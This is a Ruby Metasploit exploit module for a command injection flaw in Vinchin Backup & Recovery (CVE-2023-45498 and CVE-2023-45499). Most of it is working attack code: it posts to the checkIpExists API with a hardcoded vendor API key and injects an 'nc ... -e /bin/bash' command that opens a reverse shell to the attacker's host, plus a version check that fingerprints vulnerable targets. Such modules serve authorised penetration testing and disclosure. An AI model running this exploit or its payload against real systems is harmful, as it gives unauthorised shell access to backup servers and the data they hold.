##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Vinchin Backup and Recovery Command Injection',
        'Description' => %q{
          This module exploits a command injection vulnerability in Vinchin Backup & Recovery
          v5.0.*, v6.0.*, v6.7.*, and v7.0.*. Due to insufficient input validation in the
          checkIpExists API endpoint, an attacker can execute arbitrary commands as the
          web server user.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Gregory Boddin (LeakIX)', # Vulnerability discovery
          'Valentin Lobstein' # Metasploit module
        ],
        'References' => [
          ['CVE', '2023-45498'],
          ['CVE', '2023-45499'],
          ['URL', 'https://nvd.nist.gov/vuln/detail/CVE-2023-45498'],
          ['URL', 'https://nvd.nist.gov/vuln/detail/CVE-2023-45499'],
          ['URL', 'https://blog.leakix.net/2023/10/vinchin-backup-rce-chain/'],
          ['URL', 'https://vinchin.com/'] # Vendor URL
        ],
        'DisclosureDate' => '2023-10-26',
        'Notes' => {
          'Stability' => [ CRASH_SAFE ],
          'SideEffects' => [ IOC_IN_LOGS ],
          'Reliability' => [ REPEATABLE_SESSION ],
          'AKA' => ['Vinchin Command Injection']
        },
        'Platform' => ['linux', 'unix'],
        'Targets' => [
          ['Automatic', {}]
        ],
        'DefaultTarget' => 0,
        'DefaultOptions' => {
          'PAYLOAD' => 'generic/shell_reverse_tcp',
          'SSL' => true
        },
        'Privileged' => false
      )
    )

    register_options(
      [
        Opt::RPORT(443),
        OptString.new('TARGETURI', [true, 'The base path to the Vinchin Backup & Recovery application', '/api/']),
        OptString.new('APIKEY', [true, 'The hardcoded API key', '6e24cc40bfdb6963c04a4f1983c8af71'])
      ]
    )
  end

  def exploit
    lhost = datastore['LHOST']
    lport = datastore['LPORT']
    injection_command = "nc #{lhost} #{lport} -e /bin/bash"
    data = "p={\"ip\":\"127.0.0.1 ;#{injection_command};\"}"
    print_status('Sending payload...')
    send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(datastore['TARGETURI']),
      'vars_get' => {
        'm' => '30',
        'f' => 'checkIpExists',
        'k' => datastore['APIKEY']
      },
      'data' => data
    })
  end

  def check
    target_uri_path = normalize_uri(target_uri.path.split('/')[0], '/login.php')
    res = send_request_cgi('uri' => target_uri_path)

    unless res
      print_error('Failed to connect to the target.')
      return CheckCode::Unknown('Failed to connect to the target.')
    end

    print_status("HTTP Response Code: #{res.code}")
    version_pattern = /Vinchin build: (\d+\.\d+\.\d+\.\d+)/
    version_match = res.body.match(version_pattern)

    if version_match && version_match[1]
      version = Rex::Version.new(version_match[1])
      print_status("Detected Vinchin version: #{version}")

      vulnerable_version_patterns = [
        /^((5\.0|6\.0|6\.7)\.\d+(\.\d+)?|7\.0\.(0|1)(\.\d+)?)$/
      ]

      version = Rex::Version.new(version)

      vulnerable = vulnerable_version_patterns.any? do |pattern|
        pattern.match(version.to_s)
      end

      if vulnerable
        return CheckCode::Vulnerable()
      else
        return CheckCode::Safe()
      end

    else
      print_error('Unable to extract version with the regex provided.')
      return CheckCode::Unknown('Unable to extract version.')
    end
  end
end
